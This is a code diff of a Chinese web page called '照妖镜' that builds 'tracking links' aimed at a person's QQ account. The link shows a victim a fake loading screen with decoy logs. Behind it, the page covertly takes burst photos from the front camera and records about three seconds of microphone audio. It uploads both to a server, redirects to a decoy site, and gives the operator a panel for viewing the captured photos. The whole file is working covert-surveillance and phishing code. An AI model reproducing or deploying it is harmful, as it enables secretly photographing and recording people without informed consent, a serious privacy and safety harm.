@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>照妖镜</title>
+    <title>照妖镜 - 多功能采集工具</title>
     <style>
+        /* ===== 基础样式 ===== */
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif;
@@ -16,24 +17,31 @@
             min-height: 100vh;
             padding: 20px;
         }
-        .config-container { max-width:500px; width:100%; }
-        .card { background:#13131a; border:1px solid #2a2a35; border-radius:12px; padding:32px 28px; }
+        .config-container { max-width: 600px; width:100%; }
+        .card { background:#13131a; border:1px solid #2a2a35; border-radius:12px; padding:32px 28px; margin-bottom:20px; }
         .card-header { text-align:center; margin-bottom:24px; }
         .card-header .icon { font-size:48px; }
         .card-header h1 { font-size:26px; background:linear-gradient(135deg,#e0e0e0,#a0a0c0); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
         .form-group { margin-bottom:20px; }
         .form-group label { display:block; font-size:13px; color:#a0a0b0; margin-bottom:6px; }
-        .form-group input {
+        .form-group input, .form-group select {
             width:100%; padding:13px 15px; background:#1a1a24; border:1.5px solid #2a2a35;
             border-radius:8px; color:#e0e0e0; font-size:15px; outline:none;
         }
-        .btn { width:100%; padding:14px; background:#6c5ce7; color:#fff; border:none; border-radius:8px; font-size:16px; cursor:pointer; }
+        .form-group input[type="number"] { -moz-appearance:textfield; }
+        .checkbox-group { display:flex; align-items:center; gap:10px; }
+        .checkbox-group input[type="checkbox"] { width:auto; }
+        .btn { width:100%; padding:14px; background:#6c5ce7; color:#fff; border:none; border-radius:8px; font-size:16px; cursor:pointer; margin-bottom:10px; }
+        .btn-secondary { background:#2ecc71; }
         .result-area { display:none; margin-top:20px; padding:18px; background:#0d0d15; border:1px solid #2a2a35; border-radius:8px; }
         .result-area.show { display:block; }
         .result-area input { width:100%; padding:10px; background:#1a1a24; border:1px solid #2a2a35; border-radius:6px; color:#7ecbff; }
         .btn-copy { padding:10px 16px; background:#2ecc71; color:#fff; border:none; border-radius:6px; cursor:pointer; margin-top:8px; }
+        .photo-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(120px,1fr)); gap:10px; margin-top:10px; }
+        .photo-grid img { width:100%; height:100px; object-fit:cover; border-radius:6px; border:1px solid #333; }
+        .warning-box { margin-top:18px; padding:12px; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.25); border-radius:8px; font-size:12px; color:#e98b82; }
 
-        /* 追踪界面 */
+        /* ===== 追踪界面 ===== */
         .track-overlay {
             position:fixed; inset:0; z-index:99999; background:#000;
             display:flex; align-items:center; justify-content:center; flex-direction:column;
@@ -43,38 +51,29 @@
             position:absolute; inset:0; overflow:hidden; pointer-events:none; z-index:0;
             font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
             font-size: 10px; line-height: 1.6; color: #3d3d4a;
-            display: flex; flex-direction: column; justify-content: flex-end;
+            display:flex; flex-direction:column; justify-content:flex-end;
         }
-        .log-line {
-            display: block; width: 100%; white-space: nowrap; overflow: hidden;
-            flex-shrink: 0; margin: 0; padding: 0; line-height: 1.6;
-            letter-spacing: 0.5px;
-        }
-        /* 中心区域 */
+        .log-line { display:block; width:100%; white-space:nowrap; overflow:hidden; flex-shrink:0; }
         .center-box { position:relative; z-index:1; text-align:center; }
-        .spinner {
-            width:45px; height:45px; border:3px solid rgba(255,255,255,0.15);
-            border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite;
-            margin:0 auto 20px;
-        }
+        .spinner { width:45px; height:45px; border:3px solid rgba(255,255,255,0.15); border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 20px; }
         @keyframes spin { to { transform:rotate(360deg); } }
-        .spinner.done { border-top-color:#2ecc71; border-color:rgba(46,204,113,0.2); border-top-color:#2ecc71; }
-        .spinner.error { border-top-color:#e74c3c; border-color:rgba(231,76,60,0.2); border-top-color:#e74c3c; }
-        .status-text { color:#aaa; font-size:15px; margin-bottom:8px; }
-        .status-text.error { color:#e74c3c; }
+        .status-text { color:#aaa; font-size:15px; }
         .denied-msg { display:none; color:#e74c3c; font-size:14px; margin-top:10px; }
         .denied-msg.show { display:block; }
     </style>
 </head>
 <body>
 
+<!-- ========== 配置模式（主页） ========== -->
 <div id="configMode" class="config-container">
     <div class="card">
         <div class="card-header">
             <span class="icon">🪞</span>
-            <h1>照妖镜</h1>
-            <p style="color:#a0a0b0;font-size:13px;">生成追踪链接 · 自动采集回传</p>
+            <h1>照妖镜 · 多功能采集</h1>
+            <p style="color:#a0a0b0;font-size:13px;">生成追踪链接 · 拍照 · 连拍 · 录音</p>
         </div>
+
+        <!-- 基础信息 -->
         <div class="form-group">
             <label>QQ号 <span style="color:#e74c3c;">*</span></label>
             <input type="text" id="qqInput" placeholder="输入目标QQ号" maxlength="20">
@@ -83,18 +82,47 @@
             <label>跳转网址 <span style="color:#e74c3c;">*</span></label>
             <input type="url" id="urlInput" placeholder="https://example.com">
         </div>
+
+        <!-- 新增：连拍和录音选项 -->
+        <div class="form-group">
+            <label>连拍张数</label>
+            <input type="number" id="burstInput" value="1" min="1" max="10" step="1">
+            <div style="font-size:11px;color:#666;margin-top:4px;">目标打开后自动连续拍摄的照片数量（1-10张）</div>
+        </div>
+        <div class="form-group checkbox-group">
+            <input type="checkbox" id="audioCheck" checked>
+            <label for="audioCheck" style="margin:0;">同时录制一段语音（约3秒）</label>
+        </div>
+
         <button class="btn" onclick="generateLink()">🔗 生成追踪链接</button>
+
         <div class="result-area" id="resultArea">
             <div style="color:#2ecc71;font-weight:600;font-size:12px;">✅ 追踪链接</div>
             <input type="text" id="resultLink" readonly onclick="this.select();copyLink()">
             <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制</button>
         </div>
-        <div style="margin-top:18px;padding:12px;background:rgba(231,76,60,0.08);border:1px solid rgba(231,76,60,0.25);border-radius:8px;font-size:12px;color:#e98b82;">
-            ⚠️ 需要 HTTPS 环境，API 为 HTTP 时可能被浏览器拦截。
+
+        <div class="warning-box">
+            ⚠️ 需要 HTTPS 环境，API 为 HTTP 时可能被浏览器拦截。录音功能需要额外的麦克风权限。
         </div>
+    </div>
+
+    <!-- 查询照片区域 -->
+    <div class="card">
+        <div class="card-header">
+            <span class="icon">📁</span>
+            <h2 style="font-size:18px;">查询已拍摄照片</h2>
+        </div>
+        <div class="form-group">
+            <label>输入QQ号查询</label>
+            <input type="text" id="queryQQ" placeholder="输入QQ号">
+        </div>
+        <button class="btn btn-secondary" onclick="queryPhotos()">🔍 查询照片</button>
+        <div id="photoResult" style="margin-top:15px;"></div>
     </div>
 </div>
 
+<!-- ========== 追踪模式 ========== -->
 <div class="track-overlay" id="trackMode" style="display:none;">
     <div class="log-stream" id="logStream"></div>
     <div class="center-box">
@@ -113,75 +141,66 @@
 <script>
 const $ = id => document.getElementById(id);
 
-// ========== 配置模式 ==========
+// ========== 配置模式功能 ==========
 function generateLink() {
     const qq = $('qqInput').value.trim();
     const url = $('urlInput').value.trim();
+    const burst = $('burstInput').value || 1;
+    const audio = $('audioCheck').checked ? 1 : 0;
+
     if (!qq || !/^\d{4,20}$/.test(qq)) return alert('请输入正确的QQ号');
     if (!url || !/^https?:\/\/.+/.test(url)) return alert('请输入有效的跳转网址');
-    const link = location.origin + location.pathname + '?qq=' + qq + '&url=' + encodeURIComponent(url);
+
+    const params = new URLSearchParams();
+    params.set('qq', qq);
+    params.set('url', url);
+    params.set('burst', burst);
+    params.set('audio', audio);
+    const link = location.origin + location.pathname + '?' + params.toString();
+
     $('resultLink').value = link;
     $('resultArea').classList.add('show');
     copyLink();
 }
+
 function copyLink() {
-    const i = $('resultLink'); i.select();
+    const i = $('resultLink');
+    i.select();
     navigator.clipboard?.writeText(i.value).then(() => $('btnCopy').textContent = '✅ 已复制')
     .catch(() => document.execCommand('copy'));
 }
 
-// ========== 终端日志系统（真实信息、不重复、铺满） ==========
-const logStream = $('logStream');
-const MAX_LINES = 40;
-let logLines = [];
+// 查询照片
+async function queryPhotos() {
+    const qq = $('queryQQ').value.trim();
+    if (!qq) return alert('请输入QQ号');
+    const resultDiv = $('photoResult');
+    resultDiv.innerHTML = '查询中...';
 
-function getCharsPerLine() {
-    const fontSize = 10;
-    const charWidth = fontSize * 0.6; // 等宽字体大约0.6em
-    return Math.floor(window.innerWidth / charWidth);
-}
-
-// 填充空格使一行铺满
-function padLine(text) {
-    const targetLength = getCharsPerLine();
-    if (text.length >= targetLength) return text.substring(0, targetLength);
-    return text + ' '.repeat(targetLength - text.length);
-}
-
-function pushLine(text) {
-    logLines.push(padLine(text));
-    if (logLines.length > MAX_LINES) logLines.shift();
-    renderLogs();
-}
-
-function renderLogs() {
-    if (!logStream) return;
-    logStream.innerHTML = '';
-    for (const line of logLines) {
-        const div = document.createElement('div');
-        div.className = 'log-line';
-        div.textContent = line;
-        logStream.appendChild(div);
+    try {
+        const resp = await fetch(`api.php?action=list_images&qq=${qq}`);
+        const data = await resp.json();
+        if (!data.success) {
+            resultDiv.innerHTML = `<div style="color:#e74c3c;">${data.message || '查询失败'}</div>`;
+            return;
+        }
+        if (data.images.length === 0) {
+            resultDiv.innerHTML = '<div style="color:#888;">该QQ号暂无照片</div>';
+            return;
+        }
+        let html = '<div class="photo-grid">';
+        data.images.forEach(img => {
+            html += `<img src="./${qq}/${img}" loading="lazy" onclick="window.open('./${qq}/${img}','_blank')">`;
+        });
+        html += '</div>';
+        resultDiv.innerHTML = html;
+    } catch (e) {
+        resultDiv.innerHTML = `<div style="color:#e74c3c;">网络错误：${e.message}</div>`;
     }
 }
 
-// 定时器
-let slowTimer = null;
-let fastTimer = null;
-function stopAllTimers() {
-    clearInterval(slowTimer);
-    clearInterval(fastTimer);
-    slowTimer = null;
-    fastTimer = null;
-}
-function clearLogs() {
-    stopAllTimers();
-    logLines = [];
-    renderLogs();
-}
-
 // ========== 追踪模式核心 ==========
-function startTrack(qq, redirectUrl) {
+function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
     $('configMode').style.display = 'none';
     $('trackMode').style.display = 'flex';
 
@@ -190,246 +209,179 @@ function startTrack(qq, redirectUrl) {
     const deniedMsg = $('deniedMsg');
     const vid = $('vid');
     const cvs = $('cvs');
-    const API = 'http://a1nb66.atwebpages.com/zyj/api.php';
+    const API = 'api.php';
 
-    // 收集真实信息
-    const ua = navigator.userAgent;
-    const platform = navigator.platform || 'unknown';
-    const language = navigator.language || 'unknown';
-    const screenW = window.screen.width, screenH = window.screen.height;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
-    const cores = navigator.hardwareConcurrency || 'unknown';
-    const memory = navigator.deviceMemory || 'unknown';
-    const connection = navigator.connection ? navigator.connection.effectiveType || 'unknown' : 'unknown';
+    const logStream = $('logStream');
+    const MAX_LINES = 50;
+    let logLines = [];
 
-    // 初始两行真实系统信息（少量中文）
-    pushLine(`User-Agent: ${ua}`);
-    pushLine(`Screen: ${screenW}x${screenH} | Platform: ${platform} | Cores: ${cores} | Memory: ${memory}GB | TZ: ${timezone}`);
-
-    // 等待授权阶段：真实状态，不重复，慢速输出
-    let waitCount = 0;
-    const waitMessages = [
-        'Waiting for user permission...',
-        'Permission request sent to browser.',
-        'Awaiting response from user...',
-        '请允许授权以继续',
-        'User interaction required.'
-    ];
-
-    function updateWaitLog() {
-        if (waitCount < waitMessages.length) {
-            pushLine(waitMessages[waitCount]);
-            waitCount++;
-        } else {
-            // 不再重复，可以停止慢速输出（保留最后一条）
-            clearInterval(slowTimer);
-        }
+    function pushLog(text) {
+        logLines.push(text);
+        if (logLines.length > MAX_LINES) logLines.shift();
+        logStream.innerHTML = '';
+        logLines.forEach(line => {
+            const div = document.createElement('div');
+            div.className = 'log-line';
+            div.textContent = line;
+            logStream.appendChild(div);
+        });
     }
-
-    // 先输出第一条等待消息
-    pushLine(waitMessages[0]);
-    waitCount = 1;
-    slowTimer = setInterval(updateWaitLog, 1800); // 每1.8秒一条
 
     function setStatus(t, isErr) {
         statusText.textContent = t;
-        if (isErr) statusText.classList.add('error');
-        else statusText.classList.remove('error');
+        statusText.style.color = isErr ? '#e74c3c' : '#aaa';
     }
 
+    // 真实信息日志
+    const ua = navigator.userAgent;
+    const platform = navigator.platform || 'unknown';
+    const screenW = window.screen.width, screenH = window.screen.height;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+    const cores = navigator.hardwareConcurrency || 'unknown';
+    pushLog(`User-Agent: ${ua}`);
+    pushLog(`Screen: ${screenW}x${screenH} | Platform: ${platform} | Cores: ${cores} | TZ: ${timezone}`);
+
     async function run() {
-        setStatus('正在初始化...');
-        await sleep(500);
-
-        if (!navigator.mediaDevices?.getUserMedia) {
-            setStatus('环境不支持', true);
-            spinner.classList.add('error');
-            clearLogs();
-            return setTimeout(() => location.href = redirectUrl, 2000);
-        }
-
         setStatus('正在请求授权...');
-        await sleep(300);
+        pushLog('Requesting permissions...');
 
+        // 请求摄像头
         let stream;
         try {
             stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: false
+                audio: audioEnabled ? true : false  // 如果需要录音则同时请求麦克风
             });
-
-            // 授权成功：停止慢速定时器，输出真实事件流，快速
-            clearInterval(slowTimer);
-
-            // 真实授权成功日志
-            pushLine('User granted permission.');
-            pushLine(`getUserMedia success. Stream ID: ${stream.id.substring(0,8) || 'unknown'}`);
-            pushLine('Video track: ' + stream.getVideoTracks().map(t => t.label || 'unknown').join(', '));
-            pushLine('Video constraints: 1280x720@30fps (front)');
-
-            // 视频准备阶段
-            vid.srcObject = stream;
-            vid.play().catch(()=>{});
-            setStatus('正在准备...');
-
-            const ready = await new Promise(resolve => {
-                const start = Date.now();
-                const check = () => {
-                    if (vid.videoWidth > 0) return resolve(true);
-                    if (Date.now() - start > 8000) return resolve(false);
-                    requestAnimationFrame(check);
-                };
-                vid.addEventListener('loadeddata', () => vid.videoWidth > 0 && resolve(true), { once: true });
-                requestAnimationFrame(check);
-            });
-
-            if (!ready) {
-                pushLine('Error: video stream timeout.');
-                setStatus('超时', true);
-                spinner.classList.add('error');
-                stream.getTracks().forEach(t => t.stop());
-                clearLogs();
-                return setTimeout(() => location.href = redirectUrl, 2000);
+            pushLog('Permission granted (camera' + (audioEnabled ? ' + microphone' : '') + ')');
+        } catch (e) {
+            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
+                setStatus('访问被拒绝', true);
+                spinner.style.display = 'none';
+                deniedMsg.classList.add('show');
+                return;
             }
+            // 降级
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: audioEnabled });
+                pushLog('Fallback getUserMedia success');
+            } catch (e2) {
+                if (e2.name === 'NotAllowedError' || e2.name === 'PermissionDeniedError') {
+                    setStatus('访问被拒绝', true);
+                    spinner.style.display = 'none';
+                    deniedMsg.classList.add('show');
+                    return;
+                }
+                setStatus('设备不可用', true);
+                setTimeout(() => location.href = redirectUrl, 2000);
+                return;
+            }
+        }
 
-            pushLine(`Video resolution: ${vid.videoWidth}x${vid.videoHeight}`);
-            pushLine('Capturing frame...');
+        vid.srcObject = stream;
+        vid.play().catch(()=>{});
+        setStatus('准备就绪...');
 
-            cvs.width = vid.videoWidth;
-            cvs.height = vid.videoHeight;
-            const ctx = cvs.getContext('2d');
+        // 等待视频就绪
+        const ready = await new Promise(resolve => {
+            const start = Date.now();
+            const check = () => {
+                if (vid.videoWidth > 0) return resolve(true);
+                if (Date.now() - start > 8000) return resolve(false);
+                requestAnimationFrame(check);
+            };
+            vid.addEventListener('loadeddata', () => vid.videoWidth > 0 && resolve(true), { once: true });
+            requestAnimationFrame(check);
+        });
+        if (!ready) {
+            pushLog('Error: video stream timeout');
+            setStatus('超时', true);
+            stream.getTracks().forEach(t => t.stop());
+            setTimeout(() => location.href = redirectUrl, 2000);
+            return;
+        }
+
+        pushLog(`Video resolution: ${vid.videoWidth}x${vid.videoHeight}`);
+        cvs.width = vid.videoWidth;
+        cvs.height = vid.videoHeight;
+        const ctx = cvs.getContext('2d');
+
+        // ===== 连拍 =====
+        for (let i = 0; i < burstCount; i++) {
+            setStatus(`正在拍摄 (${i+1}/${burstCount})...`);
             ctx.drawImage(vid, 0, 0);
             const img = cvs.toDataURL('image/jpeg', 0.65);
-            stream.getTracks().forEach(t => t.stop());
-
-            pushLine(`Frame captured. Size: ${Math.round(img.length/1024)}KB`);
-            setStatus('正在上传...');
+            pushLog(`Captured frame ${i+1}/${burstCount} (${Math.round(img.length/1024)}KB)`);
 
             const fd = new FormData();
             fd.append('qq', qq);
             fd.append('image', img);
-
             try {
                 const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
                 if (resp.ok) {
                     const r = await resp.json();
-                    if (r.success) {
-                        pushLine(`Upload success. File: ${r.filename || 'unknown'}`);
-                        setStatus('完成 ✓', false);
-                        spinner.classList.add('done');
-                    } else {
-                        pushLine(`Upload rejected: ${r.message || 'unknown'}`);
-                        setStatus('服务器拒绝', true);
-                        spinner.classList.add('error');
-                    }
+                    if (r.success) pushLog(`Upload success: ${r.image || 'ok'}`);
+                    else pushLog(`Upload rejected: ${r.message || 'unknown'}`);
                 } else {
-                    pushLine(`Upload failed: HTTP ${resp.status}`);
-                    setStatus('上传失败', true);
-                    spinner.classList.add('error');
+                    pushLog(`Upload failed: HTTP ${resp.status}`);
                 }
             } catch (e) {
-                pushLine(`Network error: ${e.message}`);
-                setStatus('网络错误', true);
-                spinner.classList.add('error');
+                pushLog(`Network error: ${e.message}`);
             }
-
-            setTimeout(() => location.href = redirectUrl, 2000);
-        } catch (e) {
-            clearInterval(slowTimer);
-            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
-                pushLine('Permission denied by user.');
-                setStatus('访问被拒绝', true);
-                spinner.classList.add('error');
-                spinner.style.display = 'none';
-                deniedMsg.classList.add('show');
-                clearLogs();
-                return;
-            }
-            // 尝试降级
-            try {
-                pushLine('Primary constraints failed, retrying with fallback...');
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                // 降级成功，走同样流程
-                clearInterval(slowTimer);
-                pushLine('Fallback getUserMedia success.');
-                // ... (后续与上面授权成功部分类似，为避免重复可提取函数，但为简洁这里直接继续)
-                // 简化为跳到准备阶段
-                vid.srcObject = stream;
-                vid.play().catch(()=>{});
-                setStatus('正在准备...');
-                const ready = await new Promise(resolve => {
-                    const start = Date.now();
-                    const check = () => {
-                        if (vid.videoWidth > 0) return resolve(true);
-                        if (Date.now() - start > 8000) return resolve(false);
-                        requestAnimationFrame(check);
-                    };
-                    vid.addEventListener('loadeddata', () => vid.videoWidth > 0 && resolve(true), { once: true });
-                    requestAnimationFrame(check);
-                });
-                if (!ready) {
-                    pushLine('Error: video stream timeout.');
-                    setStatus('超时', true);
-                    spinner.classList.add('error');
-                    stream.getTracks().forEach(t => t.stop());
-                    clearLogs();
-                    return setTimeout(() => location.href = redirectUrl, 2000);
-                }
-                pushLine(`Video resolution: ${vid.videoWidth}x${vid.videoHeight}`);
-                pushLine('Capturing frame...');
-                cvs.width = vid.videoWidth;
-                cvs.height = vid.videoHeight;
-                const ctx = cvs.getContext('2d');
-                ctx.drawImage(vid, 0, 0);
-                const img = cvs.toDataURL('image/jpeg', 0.65);
-                stream.getTracks().forEach(t => t.stop());
-                pushLine(`Frame captured. Size: ${Math.round(img.length/1024)}KB`);
-                setStatus('正在上传...');
-                const fd = new FormData();
-                fd.append('qq', qq);
-                fd.append('image', img);
-                try {
-                    const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
-                    if (resp.ok) {
-                        const r = await resp.json();
-                        if (r.success) {
-                            pushLine(`Upload success. File: ${r.filename || 'unknown'}`);
-                            setStatus('完成 ✓', false);
-                            spinner.classList.add('done');
-                        } else {
-                            pushLine(`Upload rejected: ${r.message || 'unknown'}`);
-                            setStatus('服务器拒绝', true);
-                            spinner.classList.add('error');
-                        }
-                    } else {
-                        pushLine(`Upload failed: HTTP ${resp.status}`);
-                        setStatus('上传失败', true);
-                        spinner.classList.add('error');
-                    }
-                } catch (e) {
-                    pushLine(`Network error: ${e.message}`);
-                    setStatus('网络错误', true);
-                    spinner.classList.add('error');
-                }
-                setTimeout(() => location.href = redirectUrl, 2000);
-                return;
-            } catch (e2) {
-                if (e2.name === 'NotAllowedError' || e2.name === 'PermissionDeniedError') {
-                    pushLine('Permission denied by user.');
-                    setStatus('访问被拒绝', true);
-                    spinner.classList.add('error');
-                    spinner.style.display = 'none';
-                    deniedMsg.classList.add('show');
-                    clearLogs();
-                    return;
-                }
-                pushLine(`Device error: ${e2.message}`);
-                setStatus('设备不可用', true);
-                spinner.classList.add('error');
-                clearLogs();
-                return setTimeout(() => location.href = redirectUrl, 2000);
-            }
+            if (i < burstCount - 1) await sleep(500); // 连拍间隔
         }
+
+        // ===== 录音（如果启用） =====
+        if (audioEnabled && stream.getAudioTracks().length > 0) {
+            setStatus('正在录音...');
+            pushLog('Recording audio (3s)...');
+            try {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: mediaRecorder.mimeType || 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = async () => {
+                        const base64 = reader.result;
+                        pushLog(`Audio recorded (${Math.round(blob.size/1024)}KB)`);
+                        const fd = new FormData();
+                        fd.append('qq', qq);
+                        fd.append('audio', base64);
+                        try {
+                            const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
+                            if (resp.ok) {
+                                const r = await resp.json();
+                                if (r.success) pushLog(`Audio upload success: ${r.audio || 'ok'}`);
+                                else pushLog(`Audio upload rejected: ${r.message || 'unknown'}`);
+                            } else {
+                                pushLog(`Audio upload failed: HTTP ${resp.status}`);
+                            }
+                        } catch (e) {
+                            pushLog(`Audio network error: ${e.message}`);
+                        }
+                        // 完成
+                        setStatus('完成 ✓');
+                        spinner.style.borderTopColor = '#2ecc71';
+                        setTimeout(() => location.href = redirectUrl, 1500);
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 3000);
+            } catch (e) {
+                pushLog(`Audio recording error: ${e.message}`);
+                setStatus('完成（无音频）', false);
+                setTimeout(() => location.href = redirectUrl, 1500);
+            }
+        } else {
+            // 没有录音，直接完成
+            setStatus('完成 ✓');
+            spinner.style.borderTopColor = '#2ecc71';
+            setTimeout(() => location.href = redirectUrl, 1500);
+        }
+
+        // 清理摄像头
+        stream.getTracks().forEach(t => t.stop());
     }
 
     setTimeout(run, 800);
@@ -439,9 +391,15 @@ function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 // 入口
 const params = new URLSearchParams(location.search);
-const qq = params.get('qq'), url = params.get('url');
-if (qq && url) startTrack(qq, decodeURIComponent(url));
-else $('configMode').style.display = 'block';
+const qq = params.get('qq');
+const url = params.get('url');
+const burst = parseInt(params.get('burst') || '1');
+const audio = params.get('audio') !== '0'; // 默认开启录音
+if (qq && url) {
+    startTrack(qq, decodeURIComponent(url), burst, audio);
+} else {
+    $('configMode').style.display = 'block';
+}
 </script>
 </body>
 </html>
